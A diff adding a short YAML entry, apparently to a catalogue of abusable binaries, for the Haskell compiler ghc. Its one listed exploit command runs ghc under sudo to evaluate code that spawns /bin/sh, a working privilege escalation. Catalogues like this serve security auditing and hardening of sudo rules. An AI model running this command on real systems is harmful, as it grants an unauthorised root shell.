@@ -1,0 +1,4 @@
+name: ghc
+binary_path: /usr/bin/ghc
+exploit_cmds:
+- sudo /usr/bin/ghc -e 'System.Process.callCommand "/bin/sh"'
